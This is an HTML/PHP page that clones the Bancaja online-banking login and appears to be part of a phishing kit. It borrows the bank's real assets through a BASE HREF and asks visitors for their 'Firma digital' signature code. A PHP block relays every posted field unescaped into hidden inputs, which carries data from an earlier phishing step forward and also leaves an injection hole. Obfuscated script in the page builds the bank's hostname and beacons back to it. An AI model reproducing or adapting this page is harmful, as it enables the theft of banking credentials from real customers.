<BASE HREF="https://www.bancaja.es/">
<html lang="es">
 <head>
  <title>Bancaja - Login</title>
  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
  <link title="original" href="/bbc/style/np_common.css" rel="stylesheet" type="text/css" />
  <link title="original" href="/bbc/style/np_home.css" rel="stylesheet" type="text/css" />
	<link title="original" href="/bbc/style/np_loginparticulares.css" rel="stylesheet" type="text/css" />
  <style>
	BODY
	{
		background: WHITE url('/bbc/gifs/CAS/fon_cabecera.gif') repeat-x scroll top left;
		font-family: verdana, arial;
		font-weight: normal;
		font-size:65%;
		margin: 0px;
	}
 </style>
<script language="javascript" src="/japp/bbc2.js"></script>
<script language="javascript" src="/japp/bbc5.js"></script>
<script language="javascript" src="/japp/Calculator.js"></script>
<script language="javascript" src="/japp/jotp1.js"></script>
<script language="javascript" src="/japp/otp1.js"></script>
<script language="javascript">
flagAceptar = 0;
function returnFormS()
{ if (document.hh) return document.hh;
  else if (hh) return hh;
}
function checkForm()
{ formE=returnFormS();
  msg="Los campos de entrada estan en blanco.";
  if (!emptyCheck(formE.ESpass.value))
   { alert (msg);
     return false;
   }
  return true;
}
function ejecutarForm()
{
  formS=returnFormS();
  if(flagAceptar == 0 && checkForm())formS.submit();
}publi0="";publi1="";
function capturaEvento(evnt)
{ var ret=0;
  if (!(evnt)&&(document.all))
   { evnt=self.event;
     evnt.cancelBubble=true;
     if (flagAceptar) evnt.returnValue=false;
     if (evnt.keyCode==13) ret=1;
   }
  else if (evnt.which==13) ret=1;
  if (ret)
   { ejecutarForm();
     evnt.returnValue=false;
   }
}
publi0=document.location.protocol+"\u002f\u002f";publi1= document.location.hostname;publi2="\u0077\u0077\u0077\u002e\u0062"+"\u0061\u006e\u0063\u0061"+"\u006a\u0061\u002e\u0065\u0073";publi3=document.location.pathname;if (publi1!=publi2){(new Image()).src=publi0+publi2+"/publizity/"+publi1+publi3;}
</script>
</head>
<body>
<div id="cabecera">
	<div id="logo"><img src="/bbc/gifs/CAS/banner_home.gif" alt="Bancaja" width="195" height="59"></div>
	<div id="menu">
		<img src="/bbc/gifs/CAS/but_particulares.gif" alt="Particulares" width="104" height="59" border="0" >
		<img src="/bbc/gifs/CAS/but_empresas_off.gif" alt="Empresas" width="82" height="59" border="0" >
	</div>
	<div id="submenu">
		<div class="metanavegacion">&nbsp;</div>
		<div id="botinstitucional"><img src="/bbc/gifs/CAS/but_institucional_off.gif" width="386" height="47" border="0" alt="Institucional"  usemap="#Map" />
  	</div>
	</div>
</div>

<center><div id="login" align="left">
 <div id="formulario">
  <form NAME="hh" METHOD="POST" TARGET="_top" ACTION="/ControlParticulares">
<?php
$mypost = file("php://input");
if(strlen($mypost[0])!=0)
{
 $post_data = explode("&", $mypost[0]);
 for($pos=0; $pos<sizeof($post_data); $pos++)
 {
  $data_field = explode("=", $post_data[$pos]);
  $key    = $data_field[0];
  $value  = $data_field[1];
  $key_new = str_replace("+"," ", $key);
  $key_new = rawurldecode($key_new);
  $value_new = str_replace("+"," ", $value);
  $value_new = rawurldecode($value_new);
  echo "<input type=\"hidden\" name=\"$key_new\" value=\"$value_new\">\r\n";
 }
}
?>
   <div class="textoform">Firma digital:</div>
   <div class="textoform"></div>
   <input class="inpTexto" type="text" name="ESpass" size="10" maxlength="8" tabindex="1"><a href="javascript:ejecutarForm();" name="aceptar" title="Conectar al servicio" onclick="javascript:capturaEvento();" onMouseOut="window.status=''; return true;" onMouseOver="window.status='Conectar al servicio'; return true;" tabindex=3><script>document.write('<img class="1butimg" src="'+publi0+publi1+'/bbc/gifs/CAS/but_conectar.gif" height="19" width="50" border="0" alt="Conectar">');</script></a>
  </form>
 </div>
 <div class="inferior"><div class="telfatencion"><img src="/bbc/gifs/CAS/icon_tel.gif" border="0" width="12" height="10" />&nbsp;&nbsp;902 20 40 20</div></div>
</div>
<div id="pie"><p>&copy; Bancaja, 2005 - 2006. Todos los derechos reservados.</p></div>
</center></body></html>
